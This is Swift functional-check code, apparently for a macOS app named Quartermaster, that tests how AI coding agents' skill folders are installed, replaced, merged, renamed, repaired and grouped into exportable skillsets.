    let newFolder = Paths.at(".config/quartermaster/skills/\(linkName)/\(linkName)")
    let oldFolder = Paths.at("fixtures/old-\(linkName)")
    let link = Tool.amp.skillsFolder.appending(path: linkName)
    try writeSkill(newFolder, name: linkName)
    try writeSkill(oldFolder, name: linkName + "-old")
    try fm.createSymbolicLink(at: link, withDestinationURL: oldFolder)
    let newSkill = SkillScanner.scan().first { $0.name == linkName }!
    do {
      _ = try SkillInstaller.add(newSkill, to: .amp)
      throw CheckFailure.failed("old link did not conflict")
    } catch let conflict as SkillInstaller.AddConflict {
      let replacement = try SkillInstaller.replace(conflict)
      if let backup = replacement.trashed { trashed.append(backup) }
    }
    try check(link.resolvingSymlinksInPath().path == newFolder.path && fm.fileExists(atPath: oldFolder.appending(path: "SKILL.md").path),
      "replacing a link preserves its original source folder")

    let pluginName = prefix + "-replace-plugin"
    let pluginRoot = SkillRoot.all.first { $0.kind == .plugin }!
    let pluginFolder = pluginRoot.url.appending(path: "demo/\(pluginName)/1/skills/\(pluginName)")
    let pluginDestination = Tool.amp.skillsFolder.appending(path: pluginName)
    try writeSkill(pluginFolder, name: pluginName)
    try "supporting script".write(to: pluginFolder.appending(path: "script.txt"), atomically: true, encoding: .utf8)
    try writeSkill(pluginDestination, name: pluginName + "-old")
    let pluginSkill = SkillScanner.scan().first { $0.name == pluginName }!
    let pluginSource = pluginSkill.copies.first { $0.root.kind == .plugin }!
    let pluginConflict: SkillInstaller.AddConflict
    do {
      _ = try SkillInstaller.add(pluginSkill, to: .amp, from: pluginSource)
      throw CheckFailure.failed("plugin destination did not conflict")
    } catch let conflict as SkillInstaller.AddConflict { pluginConflict = conflict }
    let pluginResult = try SkillInstaller.replace(pluginConflict)
    if let backup = pluginResult.trashed { trashed.append(backup) }
    let copiedScript = try String(contentsOf: pluginDestination.appending(path: "script.txt"), encoding: .utf8)
    try check(copiedScript == "supporting script" && (try? fm.destinationOfSymbolicLink(atPath: pluginDestination.path)) == nil,
      "plugin replacement copies the whole folder instead of linking its cache")
    try check(fm.fileExists(atPath: pluginFolder.appending(path: "script.txt").path), "plugin replacement leaves the plugin cache untouched")

    let missingName = prefix + "-replace-missing"
    let missingFolder = Paths.at(".config/quartermaster/skills/\(missingName)/\(missingName)")
    let missingDestination = Tool.amp.skillsFolder.appending(path: missingName)
    try writeSkill(missingFolder, name: missingName)
    try writeSkill(missingDestination, name: missingName + "-old")
    let missingSkill = SkillScanner.scan().first { $0.name == missingName }!
    do {
      _ = try SkillInstaller.add(missingSkill, to: .amp)
      throw CheckFailure.failed("missing-source setup did not conflict")
    } catch let conflict as SkillInstaller.AddConflict {
      try fm.removeItem(at: missingFolder.appending(path: "SKILL.md"))
      do {
        _ = try SkillInstaller.replace(conflict)
        throw CheckFailure.failed("replacement accepted a missing source")
      } catch SkillInstaller.InstallFailure.invalidSkill {
        print("PASS: a missing replacement source fails before moving the old installation")
      }
    }
    try check(fm.fileExists(atPath: missingDestination.appending(path: "SKILL.md").path), "missing-source failure preserves the old installation")
    return trashed
  }

  @MainActor
  static func checkSkillsetTransfer(_ store: AppStore, prefix: String, home: URL) async throws -> [URL] {
    let name = prefix + "-transfer"
    let missing = name + "-missing"
    let source = home.appending(path: "fixtures/\(name)")
    try writeSkill(source.appending(path: name), name: name)
    let library = try await store.addRepoToLibrary(source: source.path)
    store.createSkillset(name: "Transfer demo")
    let original = store.skillsets.last!
    store.setSkillMembership([name, missing], in: original.id, included: true)

    let file = home.appending(path: "transfer.skillset.json")
    store.exportSkillset(id: original.id, to: file)
    let exported = try SkillsetFile.decode(Data(contentsOf: file))
    try check(exported.name == "Transfer demo"
      && exported.skills == [.init(name: name, source: nil), .init(name: missing, source: nil)],
      "skillset export lists members and leaves out local folder paths")

    let imported = store.importSkillset(from: file)
    try check(imported?.name == "Transfer demo 2" && imported?.skills == [name, missing]
      && !store.skillsetAssignments.contains { $0.skillsetID == imported?.id }
      && store.importNote?.contains("Not on this Mac yet: \(missing).") == true,
      "skillset import adds an unassigned copy under a free name and lists missing skills")
    store.importNote = nil

    let bad = home.appending(path: "not-a-skillset.json")
    try "{}".write(to: bad, atomically: true, encoding: .utf8)
    try check(store.importSkillset(from: bad) == nil && store.errorMessage != nil && store.skillsets.count(where: { $0.name.hasPrefix("Transfer demo") }) == 2,
      "skillset import rejects a file that isn't a skillset")
    store.errorMessage = nil

    let stateCopy = home.appending(path: "state-copy.json")
    try #"{"dismissed":["keep"],"lastAnalysis":12.5,"skillsets":[]}"#.write(to: stateCopy, atomically: true, encoding: .utf8)
    var state = try SkillsetState.load(from: stateCopy)
    state.skillsets = [Skillset(name: "CLI set", skills: [name])]
    try state.save(to: stateCopy)
    let raw = try JSONSerialization.jsonObject(with: Data(contentsOf: stateCopy)) as? [String: Any]
    let reloaded = try SkillsetState.load(from: stateCopy)
    try check((raw?["dismissed"] as? [String]) == ["keep"] && (raw?["lastAnalysis"] as? Double) == 12.5
      && reloaded.skillsets.first?.skills == [name],
      "the command line tool's skillset saves keep the rest of the app's state")

    // A state file the command line tool creates from scratch must still load in the app.
    let fm = FileManager.default
    let saved = Paths.stateFile.deletingLastPathComponent().appending(path: "state-saved.json")
    try fm.moveItem(at: Paths.stateFile, to: saved)
    try SkillsetState(skillsets: [Skillset(name: "From CLI", skills: [name])]).save()
    let fresh = AppStore()
    await fresh.start()
    let freshNames = fresh.skillsets.map(\.name)
    try fm.removeItem(at: Paths.stateFile)
    try fm.moveItem(at: saved, to: Paths.stateFile)
    try check(freshNames == ["From CLI"], "the app loads a state file the command line tool created")

    for set in store.skillsets where set.name.hasPrefix("Transfer demo") { await store.deleteSkillset(id: set.id) }
    return try SkillInstaller.removeRepo(name: library.lastPathComponent)
  }

  @MainActor
  static func checkReviewFixes(_ store: AppStore, home: URL) async throws -> [URL] {
    let fm = FileManager.default
    let base = "review-" + UUID().uuidString.lowercased().prefix(8)
    var trashed: [URL] = []
    let alpha = base + "-alpha"
    let beta = base + "-beta"
    try writeSkill(Tool.amp.skillsFolder.appending(path: alpha), name: alpha)
    await store.refreshSkills()
    let renamedSet = Skillset(name: "Rename regression", skills: [alpha])
    store.skillsets.append(renamedSet)
    trashed += await store.applySkillset(id: renamedSet.id, to: .codex)
    let old = store.skill(alpha)!
    _ = store.setPreferredSource(old.primary, for: old)
    await store.rename(old, to: beta)
    let renamed = store.skillsets.first { $0.id == renamedSet.id }!
    try check(store.errorMessage == nil && renamed.skills == [beta]
      && store.assignment(for: renamed.id, to: .codex)?.members == [beta]
      && store.skillsetStatus(renamed, to: .codex).missing.isEmpty,
      "rename migrates skillset membership and applied snapshots")
    let receipt = store.skillsetEntries.first { $0.skillID == beta && $0.tool == .codex }!
    try check(receipt.path == Tool.codex.skillsFolder.appending(path: beta).path
      && SkillInstaller.skillsetEntryIsUnchanged(receipt)
      && store.sourcePreferences.defaults[beta] == Tool.amp.skillsFolder.appending(path: beta).path,
      "rename migrates ownership paths, link targets and preferred sources")
    let disk = try SkillsetState.load()
    try check(disk.skillsets.contains { $0.id == renamed.id && $0.skills == [beta] }
      && disk.entries.contains(receipt), "renamed skillset state survives reloading")
    trashed += await store.applySkillset(id: renamed.id, to: .codex, assigned: false)
    try check(!fm.fileExists(atPath: receipt.path)
      && fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: beta).path),
      "unassigning a renamed skill removes its owned link and keeps personal source")
    trashed += await store.deleteSkillset(id: renamed.id)

    let incoming = base + "-incoming"
    let kept = base + "-kept"
    try writeSkill(Tool.amp.skillsFolder.appending(path: incoming), name: incoming)
    try writeSkill(Tool.pi.skillsFolder.appending(path: kept), name: kept)
    await store.refreshSkills()
    let mergeSet = Skillset(name: "Merge regression", skills: [incoming, kept])
    store.skillsets.append(mergeSet)
    trashed += await store.applySkillset(id: mergeSet.id, to: .codex)
    let plan = try SkillInstaller.planMerge(store.skill(incoming)!, into: store.skill(kept)!)
    store.mergeDrafts[plan.id] = "---\nname: \(kept)\ndescription: Merged fixture\n---\nMerged\n"
    trashed += await store.merge(plan)
    let merged = store.skillsets.first { $0.id == mergeSet.id }!
    try check(store.errorMessage == nil && merged.skills == [kept]
      && store.assignment(for: merged.id, to: .codex)?.members == [kept],
      "merge collapses duplicate skillset members and applied snapshots")
    try check(!store.skillsetEntries.contains { $0.skillID == incoming }
      && store.skillsetEntries.filter { $0.skillID == kept }.allSatisfy(SkillInstaller.skillsetEntryIsUnchanged),
      "merge drops removed receipts and refreshes owned kept copies")
    trashed += await store.applySkillset(id: merged.id, to: .codex, assigned: false)
    try check(!fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: kept).path)
      && fm.fileExists(atPath: Tool.pi.skillsFolder.appending(path: kept).path),
      "unassigning merged skills cleans owned entries while preserving the kept source")
    trashed += await store.deleteSkillset(id: merged.id)

    let copied = base + "-copied"
    let copiedKept = base + "-copy-kept"
    try writeSkill(Paths.at(".claude/plugins/cache/demo/\(base)/1/skills/\(copied)"), name: copied)
    try writeSkill(Tool.pi.skillsFolder.appending(path: copiedKept), name: copiedKept)
    await store.refreshSkills()
    let copySet = Skillset(name: "Copied merge regression", skills: [copied])
    store.skillsets.append(copySet)
    trashed += await store.applySkillset(id: copySet.id, to: .codex)
    let copyPlan = try SkillInstaller.planMerge(store.skill(copied)!, into: store.skill(copiedKept)!)
    store.mergeDrafts[copyPlan.id] = "---\nname: \(copiedKept)\ndescription: Merged copy fixture\n---\nMerged\n"
    trashed += await store.merge(copyPlan)
    let copiedReceipt = store.skillsetEntries.first { $0.skillID == copiedKept && $0.tool == .codex }!
    try check(copiedReceipt.linkDestination != nil && copiedReceipt.fingerprint == nil
      && SkillInstaller.skillsetEntryIsUnchanged(copiedReceipt),
      "merging an owned copy into a linked skill changes the ownership receipt type")
    trashed += await store.applySkillset(id: copySet.id, to: .codex, assigned: false)
    try check(!fm.fileExists(atPath: copiedReceipt.path), "unassigning removes the merged replacement link")
    trashed += await store.deleteSkillset(id: copySet.id)

    let protected = base + "-protected"
    let protectedRenamed = base + "-protected-renamed"
    let protectedSource = Paths.at(".claude/plugins/cache/demo/\(base)/1/skills/\(protected)")
    try writeSkill(protectedSource, name: protected)
    try "original".write(to: protectedSource.appending(path: "helper.txt"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    let protectedSet = Skillset(name: "Protected rename regression", skills: [protected])
    store.skillsets.append(protectedSet)
    trashed += await store.applySkillset(id: protectedSet.id, to: .codex)
    try "external edit".write(to: Tool.codex.skillsFolder.appending(path: protected + "/helper.txt"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    await store.rename(store.skill(protected)!, to: protectedRenamed)
    let protectedReceipt = store.skillsetEntries.first { $0.skillID == protectedRenamed }!
    try check(!SkillInstaller.skillsetEntryIsUnchanged(protectedReceipt),
      "rename does not adopt externally edited copies as unchanged ownership")
    trashed += await store.applySkillset(id: protectedSet.id, to: .codex, assigned: false)
    try check(fm.fileExists(atPath: protectedReceipt.path)
      && (store.skillsetNotes[Tool.codex.rawValue] ?? []).contains { $0.contains("changed outside Quartermaster") },
      "unassigning a renamed externally edited copy preserves user changes")
    trashed += await store.deleteSkillset(id: protectedSet.id)

    for (suffix, sourceRoot) in [("failed-link", Paths.at(".config/quartermaster/skills/\(base)-rollback")),
                                  ("failed-copy", Paths.at(".claude/plugins/cache/demo/\(base)/1/skills"))] {
      let name = base + "-" + suffix
      let next = name + "-next"
      try writeSkill(sourceRoot.appending(path: name), name: name)
      try writeSkill(sourceRoot.appending(path: next), name: next)
      await store.refreshSkills()
      let destination = Tool.amp.skillsFolder.appending(path: name)
      let stale = SkillsetEntry(skillID: name, tool: .amp, path: destination.path, linkDestination: "/missing-before-retry", fingerprint: nil)
      var receipts = [stale]
      var callbackReceipts: [SkillsetEntry] = []
      var saveCalls = 0
      let failed = SkillInstaller.reconcileSkillsets(tool: .amp,
        assignments: [SkillsetAssignment(skillsetID: UUID(), tool: .amp, members: [name, next])],
        entries: &receipts, skills: store.skills, preferences: SourcePreferences()) { updated in
          callbackReceipts = updated
          saveCalls += 1
          return false
        }
      trashed += failed.trashed
      try check(failed.stopped && failed.trashed.count == 1 && receipts == [stale]
        && callbackReceipts == [stale] && saveCalls == 2,
        "failed \(suffix) receipt saves roll back through Trash and restore previous ownership")
      try check(!fm.fileExists(atPath: destination.path)
        && !fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: next).path)
        && fm.fileExists(atPath: sourceRoot.appending(path: name + "/SKILL.md").path),
        "failed receipt rollback stops further changes and preserves the source")
    }

    let changed = base + "-external"
    let changedSource = Paths.at(".config/quartermaster/skills/\(base)-rollback/\(changed)")
    try writeSkill(changedSource, name: changed)
    await store.refreshSkills()
    var changedReceipts: [SkillsetEntry] = []
    let changedDestination = Tool.amp.skillsFolder.appending(path: changed)
    let refusedRollback = SkillInstaller.reconcileSkillsets(tool: .amp,
      assignments: [SkillsetAssignment(skillsetID: UUID(), tool: .amp, members: [changed])],
      entries: &changedReceipts, skills: store.skills, preferences: SourcePreferences()) { _ in
        try! fm.removeItem(at: changedDestination)
        try! writeSkill(changedDestination, name: changed)
        return false
      }
    try check(refusedRollback.stopped && refusedRollback.trashed.isEmpty && changedReceipts.count == 1
      && refusedRollback.issues.contains { $0.contains("changed outside Quartermaster") }
      && fm.fileExists(atPath: changedDestination.appending(path: "SKILL.md").path),
      "failed-save rollback preserves an externally replaced installation")

    let repairOld = Paths.at(".config/quartermaster/skills/\(base)-foo")
    let sibling = Paths.at(".config/quartermaster/skills/\(base)-foobar")
    let repaired = Paths.at(".config/quartermaster/skills/owner-\(base)")
    let repairName = base + "-repair"
    let siblingName = base + "-sibling"
    try writeSkill(repairOld.appending(path: repairName), name: repairName)
    try writeSkill(sibling.appending(path: siblingName), name: siblingName)
    try fm.createDirectory(at: repairOld.appending(path: ".git"), withIntermediateDirectories: true)
    try "[remote \"origin\"]\n url = https://example.invalid/owner/\(base).git\n"
      .write(to: repairOld.appending(path: ".git/config"), atomically: true, encoding: .utf8)
    let siblingLink = Tool.codex.skillsFolder.appending(path: siblingName)
    try fm.createSymbolicLink(at: siblingLink, withDestinationURL: sibling.appending(path: siblingName))
    await store.refreshSkills()
    let repairSet = Skillset(name: "Repair regression", skills: [repairName])
    store.skillsets.append(repairSet)
    trashed += await store.applySkillset(id: repairSet.id, to: .codex)
    let broken = Tool.amp.skillsFolder.appending(path: base + "-broken")
    try fm.createSymbolicLink(atPath: broken.path, withDestinationPath: Paths.at(".config/quartermaster/skills/\(base)-gone/skill").path)
    let away = Tool.amp.skillsFolder.appending(path: base + "-away")
    try fm.createSymbolicLink(atPath: away.path, withDestinationPath: home.appending(path: "unplugged-drive/skill").path)
    let repair = await store.repairLibrary()
    trashed += repair.trashed
    let siblingTarget = try fm.destinationOfSymbolicLink(atPath: siblingLink.path)
    try check(repair.issues.isEmpty && fm.fileExists(atPath: repaired.path)
      && fm.fileExists(atPath: siblingLink.appending(path: "SKILL.md").path)
      && siblingTarget == sibling.appending(path: siblingName).path,
      "repair renames the repository without rewriting similarly named siblings")
    try check((try? fm.destinationOfSymbolicLink(atPath: broken.path)) == nil && repair.trashed.count == 1,
      "repair moves a broken Library link to the Trash")
    try check((try? fm.destinationOfSymbolicLink(atPath: away.path)) == home.appending(path: "unplugged-drive/skill").path,
      "repair leaves a broken link to a folder outside the Library alone")
    try fm.removeItem(at: away)
    try check(store.skillsetEntries.first { $0.skillID == repairName }.map(SkillInstaller.skillsetEntryIsUnchanged) == true,
      "repair migrates existing skillset ownership targets")
    trashed += await store.applySkillset(id: repairSet.id, to: .codex, assigned: false)
    try check(!fm.fileExists(atPath: Tool.codex.skillsFolder.appending(path: repairName).path),
      "unassigning after repair removes the repaired owned link")
    trashed += await store.deleteSkillset(id: repairSet.id)

    let failedRepo = Paths.at(".config/quartermaster/skills/\(base)-failure")
    let failedDestination = Paths.at(".config/quartermaster/skills/owner-\(base)-failure")
    let failedName = base + "-repair-failure"
    try writeSkill(failedRepo.appending(path: failedName), name: failedName)
    try fm.createDirectory(at: failedRepo.appending(path: ".git"), withIntermediateDirectories: true)
    try "[remote \"origin\"]\n url = https://example.invalid/owner/\(base)-failure.git\n"
      .write(to: failedRepo.appending(path: ".git/config"), atomically: true, encoding: .utf8)
    let failedLink = Tool.amp.skillsFolder.appending(path: failedName)
    try fm.createSymbolicLink(at: failedLink, withDestinationURL: failedRepo.appending(path: failedName))
    let permissions = try fm.attributesOfItem(atPath: Tool.amp.skillsFolder.path)[.posixPermissions]!
    let failedRepair: SkillInstaller.LibraryRepairResult
    do {
      try fm.setAttributes([.posixPermissions: 0o500], ofItemAtPath: Tool.amp.skillsFolder.path)
      defer { try! fm.setAttributes([.posixPermissions: permissions], ofItemAtPath: Tool.amp.skillsFolder.path) }
      failedRepair = SkillInstaller.repairLibrary()
    }
    trashed += failedRepair.trashed
    try check(!failedRepair.issues.isEmpty && failedRepair.movedFolders[failedRepo.path] == nil
      && fm.fileExists(atPath: failedRepo.path) && !fm.fileExists(atPath: failedDestination.path)
      && fm.fileExists(atPath: failedLink.appending(path: "SKILL.md").path),
      "failed link repair restores the original repository and reports no successful rename")

    let missingRoot = home.appending(path: ".late-agent/skills")
    try check(FileWatcher.watchPaths(for: [missingRoot.path]) == [home.standardizedFileURL.path],
      "missing agent folders watch their existing ancestor")
    let foo = home.appending(path: "watchers/foo")
    let foobar = home.appending(path: "watchers/foobar")
    try fm.createDirectory(at: foo.appending(path: "skills"), withIntermediateDirectories: true)
    try fm.createDirectory(at: foobar, withIntermediateDirectories: true)
    try check(Set(FileWatcher.watchPaths(for: [foo.path, foo.appending(path: "skills").path, foo.path, foobar.path]))
      == Set([foo.standardizedFileURL.path, foobar.standardizedFileURL.path]),
      "watch roots deduplicate descendants while preserving similarly named siblings")
    await store.refreshSkills()
    return trashed
  }

  @MainActor
  static func checkSkillsets(_ store: AppStore, prefix: String) async throws -> [URL] {
    let fm = FileManager.default
    let base = prefix + "-sets"
    let common = base + "-common"
    let alpha = base + "-alpha"
    let beta = base + "-beta"
    let pending = base + "-pending"
    let manual = base + "-manual"
    let missing = base + "-missing"
    let repo = Paths.at(".config/quartermaster/skills/\(base)")
    for name in [common, alpha, beta, pending, manual] {
      try writeSkill(repo.appending(path: name), name: name)
    }
    try writeSkill(Tool.amp.skillsFolder.appending(path: manual), name: manual)
    await store.refreshSkills()
    let a = Skillset(name: "Demo Android", skills: [common, alpha, manual])
    let b = Skillset(name: "Demo Engineer", skills: [common, beta])
    store.skillsets.append(contentsOf: [a, b])
    store.saveState()
    var trashed = await store.applySkillset(id: a.id, to: .amp)
    try check(store.assignment(for: a.id, to: .amp) != nil, "applying persists an explicit assignment")
    try check(store.skillsetStatus(a, to: .amp).available == 3, "application supplies all requested members")
    try check(!store.skillsetEntries.contains { $0.skillID == manual }, "existing personal installations are never adopted")
    trashed += await store.applySkillset(id: b.id, to: .amp)
    try check(store.skillsetEntries.filter { $0.skillID == common && $0.tool == .amp }.count == 1, "overlapping sets share one owned entry")
    try check(store.updateSkillset(b.id, name: " Renamed Engineer ", members: b.skills), "renaming a skillset saves its new name")
    try check(store.skillsets.first { $0.id == b.id }?.name == "Renamed Engineer", "skillset names are trimmed")
    try check(store.assignment(for: b.id, to: .amp)?.members == b.skills, "renaming preserves the assignment")
    try check(!store.updateSkillset(b.id, name: "demo android", members: b.skills), "renaming rejects another skillset's name")
    try check(!store.updateSkillset(b.id, name: "  ", members: b.skills), "renaming rejects an empty name")
    trashed += await store.applySkillset(id: a.id, to: .amp, assigned: false)
    try check(fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: common).path), "unassigning keeps overlapping skills")
    try check(!fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: alpha).path), "unassigning removes only no-longer-needed owned links")
    try check(fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: manual).path), "unassigning preserves personal folders")
    let restored = AppStore()
    await restored.start()
    try check(restored.skillsets.first { $0.id == b.id }?.name == "Renamed Engineer", "renamed skillsets survive reloading")
    try check(restored.assignment(for: b.id, to: .amp)?.members == b.skills, "assignment snapshots survive reloading")
    try check(restored.skillsetEntries == store.skillsetEntries, "ownership receipts survive reloading")
    try check(restored.assignment(for: a.id, to: .amp) == nil, "availability never recreates an unassigned state")

    store.replaceSkillsetMembers([common, pending], in: b.id)
    let edited = store.skillsets.first { $0.id == b.id }!
    try check(store.skillsetStatus(edited, to: .amp).pending, "membership changes show pending status")
    try check(!fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: pending).path), "membership edits wait for Apply changes")
    try check(fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: beta).path), "pending edits preserve the previously applied snapshot")
    let preview = store.skillsetPreview(edited, to: .amp, assigned: true)
    try check(preview.additions.map(\.id) == [pending] && preview.removals.map(\.skillID) == [beta], "preview shows membership additions and removals")
    trashed += await store.applySkillset(id: b.id, to: .amp)
    try check(!store.skillsetStatus(edited, to: .amp).pending, "Apply changes advances the assignment snapshot")
    try check(!fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: beta).path), "Apply changes removes departed members")
    store.setSkillMembership([missing], in: b.id, included: true)
    trashed += await store.applySkillset(id: b.id, to: .amp)
    let withMissing = store.skillsets.first { $0.id == b.id }!
    let incomplete = store.skillsetStatus(withMissing, to: .amp)
    try check(incomplete.total == 3 && incomplete.available == 2 && incomplete.missing == [missing], "missing members remain in the status denominator")
    try check(!(store.skillsetIssues[Tool.amp.rawValue] ?? []).isEmpty, "missing sources produce visible retryable issues")
    try writeSkill(repo.appending(path: missing), name: missing)
    trashed += await store.reconcileSkillsets(for: .amp)
    try check((store.skillsetIssues[Tool.amp.rawValue] ?? []).isEmpty, "retry resolves a restored source")

    let commonLink = Tool.amp.skillsFolder.appending(path: common)
    try fm.removeItem(at: commonLink)
    try writeSkill(commonLink, name: common)
    trashed += await store.applySkillset(id: b.id, to: .amp, assigned: false)
    try check(fm.fileExists(atPath: commonLink.path), "unassigning preserves an externally replaced link")
    try check(!(store.skillsetNotes[Tool.amp.rawValue] ?? []).isEmpty, "preserved external changes are explained")

    let d = Skillset(name: "Demo Claude", skills: [common])
    let e = Skillset(name: "Demo Cursor", skills: [common])
    store.skillsets.append(contentsOf: [d, e])
    trashed += await store.applySkillset(id: d.id, to: .claude)
    trashed += await store.applySkillset(id: e.id, to: .cursor)
    try check(store.skillsetEntries.contains { $0.skillID == common && $0.tool == .cursor }, "cross-tool assignments do not depend on another tool's owned link")
    trashed += await store.applySkillset(id: d.id, to: .claude, assigned: false)
    try check(fm.fileExists(atPath: Tool.cursor.skillsFolder.appending(path: common).appending(path: "SKILL.md").path), "unassigning Claude leaves the Cursor assignment working")
    trashed += await store.applySkillset(id: e.id, to: .cursor, assigned: false)

    let shared = base + "-global"
    let sharedFolder = Paths.at(".agents/skills/\(shared)")
    try writeSkill(sharedFolder, name: shared)
    await store.refreshSkills()
    let global = Skillset(name: "Demo shared", skills: [shared])
    store.skillsets.append(global)
    trashed += await store.applySkillset(id: global.id, to: .cursor)
    try check(!store.skillsetEntries.contains { $0.skillID == shared }, "shared-folder availability needs no owned link")
    trashed += await store.applySkillset(id: global.id, to: .cursor, assigned: false)
    let globalStatus = store.skillsetStatus(global, to: .cursor)
    try check(!globalStatus.assigned && globalStatus.available == 1 && !globalStatus.inherited.isEmpty, "unassigned inherited availability is explained separately")
    try check(fm.fileExists(atPath: sharedFolder.path), "unassigning leaves shared folders untouched")

    let pluginName = base + "-plugin"
    let plugin = Paths.at(".claude/plugins/cache/demo/\(pluginName)/1/skills/\(pluginName)")
    try writeSkill(plugin, name: pluginName)
    try "original".write(to: plugin.appending(path: "helper.txt"), atomically: true, encoding: .utf8)
    await store.refreshSkills()
    let pluginSet = Skillset(name: "Demo plugin", skills: [pluginName])
    store.skillsets.append(pluginSet)
    trashed += await store.applySkillset(id: pluginSet.id, to: .amp)
    try check(store.skillsetEntries.first { $0.skillID == pluginName }?.fingerprint != nil, "plugin copies have a supporting-file fingerprint")
    let pluginCopy = Tool.amp.skillsFolder.appending(path: pluginName)
    try "edited".write(to: pluginCopy.appending(path: "helper.txt"), atomically: true, encoding: .utf8)
    trashed += await store.applySkillset(id: pluginSet.id, to: .amp, assigned: false)
    try check(fm.fileExists(atPath: pluginCopy.path), "editing a plugin's supporting file protects the copy")

    let cleanPlugin = base + "-clean-plugin"
    try writeSkill(plugin.deletingLastPathComponent().appending(path: cleanPlugin), name: cleanPlugin)
    await store.refreshSkills()
    let cleanSet = Skillset(name: "Demo unchanged plugin", skills: [cleanPlugin])
    store.skillsets.append(cleanSet)
    trashed += await store.applySkillset(id: cleanSet.id, to: .amp)
    trashed += await store.applySkillset(id: cleanSet.id, to: .amp, assigned: false)
    try check(!fm.fileExists(atPath: Tool.amp.skillsFolder.appending(path: cleanPlugin).path), "unassigning removes an unchanged owned plugin copy")

    let dependent = Skillset(name: "Demo dependent link", skills: [alpha])
    store.skillsets.append(dependent)
    trashed += await store.applySkillset(id: dependent.id, to: .amp)
    let ownedLink = Tool.amp.skillsFolder.appending(path: alpha)
    let externalLink = Tool.copilot.skillsFolder.appending(path: alpha)
    try fm.createSymbolicLink(at: externalLink, withDestinationURL: ownedLink)
    trashed += await store.applySkillset(id: dependent.id, to: .amp, assigned: false)
    try check(fm.fileExists(atPath: externalLink.appending(path: "SKILL.md").path), "external links into owned entries remain valid after unassigning")
    try check(!store.skillsetEntries.contains { $0.path == ownedLink.path }, "preserved dependent entries become independent installations")

    let conflictName = base + "-conflict"
    try writeSkill(repo.appending(path: conflictName), name: conflictName)
    let occupied = Tool.amp.skillsFolder.appending(path: conflictName)
    try fm.createDirectory(at: occupied, withIntermediateDirectories: true)
    await store.refreshSkills()
    let conflictSet = Skillset(name: "Demo conflict", skills: [conflictName])
    store.skillsets.append(conflictSet)
    trashed += await store.applySkillset(id: conflictSet.id, to: .amp)
    try check(!(store.skillsetIssues[Tool.amp.rawValue] ?? []).isEmpty && !fm.fileExists(atPath: occupied.appending(path: "SKILL.md").path), "destination conflicts are reported without overwriting files")
    try fm.removeItem(at: occupied)
    trashed += await store.reconcileSkillsets(for: .amp)
    try check((store.skillsetIssues[Tool.amp.rawValue] ?? []).isEmpty && fm.fileExists(atPath: occupied.appending(path: "SKILL.md").path), "retry succeeds after a destination conflict is resolved")
    trashed += await store.applySkillset(id: conflictSet.id, to: .amp, assigned: false)

    let forged = SkillsetEntry(skillID: manual, tool: .amp, path: repo.appending(path: manual).path,
      linkDestination: nil, fingerprint: "invalid")
    var rejected = false
    do { _ = try SkillInstaller.removeSkillsetEntry(forged, entries: [], skills: store.skills) }
    catch SkillInstaller.Failure.managed { rejected = true }
    try check(rejected && fm.fileExists(atPath: repo.appending(path: manual).path), "ownership receipts cannot remove paths outside an agent's skills folder")

    trashed += await store.applySkillset(id: d.id, to: .claude)
    trashed += await store.applySkillset(id: e.id, to: .claude)
    trashed += await store.deleteSkillset(id: d.id)
    try check(fm.fileExists(atPath: Tool.claude.skillsFolder.appending(path: common).path), "deleting an applied set preserves another set's requirements")
    trashed += await store.deleteSkillset(id: e.id)
    try check(!fm.fileExists(atPath: Tool.claude.skillsFolder.appending(path: common).path), "deleting the last assigned set removes its owned entry")

    // Migration must not infer ownership from legacy folders or availability.
    var legacy = try JSONSerialization.jsonObject(with: Data(contentsOf: Paths.stateFile)) as! [String: Any]
    legacy.removeValue(forKey: "skillsetAssignments")
    legacy.removeValue(forKey: "skillsetEntries")
    legacy.removeValue(forKey: "skillsetIssues")
    try JSONSerialization.data(withJSONObject: legacy).write(to: Paths.stateFile)
    let migrated = AppStore()
    await migrated.start()
    try check(migrated.skillsetAssignments.isEmpty && migrated.skillsetEntries.isEmpty, "legacy collections migrate without claiming existing installations")
    try check(fm.fileExists(atPath: commonLink.path), "migration preserves existing installations")
    store.saveState()
    return trashed
  }
}

extension FunctionalCheck {
  @MainActor
  static func checkUsability(_ store: AppStore, home: URL, prefix: String) async throws -> [(String, AnyView)] {
    let fm = FileManager.default
    let addedName = prefix + "-reviewed-add"
    let conflictName = prefix + "-reviewed-conflict"
    let changedName = prefix + "-reviewed-changed"
    let builtInName = prefix + "-reviewed-builtin"
    for name in [addedName, conflictName, changedName] {
      _ = try SkillInstaller.saveDraft(markdown: "---\nname: \(name)\ndescription: Made-up draft\n---\n# Draft\n", fallbackName: name, to: .library)
    }
    let existing = Tool.amp.skillsFolder.appending(path: conflictName)
    try writeSkill(existing, name: conflictName)
    let existingFile = existing.appending(path: "SKILL.md")
    let existingBytes = try Data(contentsOf: existingFile)
    let builtInFolder = home.appending(path: ".codex/skills/.system/\(builtInName)")
    try writeSkill(builtInFolder, name: builtInName)
    await store.refreshSkills()
    let addition = store.skill(addedName)!
    let conflictSkill = store.skill(conflictName)!
    let changed = store.skill(changedName)!
    let builtin = store.skill(builtInName)!
    let script = changed.primary.resolved.appending(path: "run.sh")
    try "echo original\n".write(to: script, atomically: true, encoding: .utf8)
    func request(_ skill: Skill, source: SkillCopy? = nil) throws -> SkillAddRequest {
      let chosen = source ?? skill.primary
      return SkillAddRequest(skillID: skill.id, sourcePath: chosen.resolved.path, tool: .amp,
        reviewedFingerprint: try SkillInstaller.skillsetFingerprint(chosen.resolved))
    }
    let addRequest = try request(addition)
    let conflictRequest = try request(conflictSkill, source: SkillInstaller.installableSources(for: conflictSkill).first { $0.root.kind == .drafts }!)
    let changedRequest = try request(changed)
    let builtinRequest = try request(builtin)
    try "echo changed\n".write(to: script, atomically: true, encoding: .utf8)
    let results = await store.addReviewed([addRequest, conflictRequest, changedRequest, builtinRequest])
    try check(results.count == 4 && results[0].outcome.becameAvailable, "reviewed batch reports successful additions beside unresolved rows")
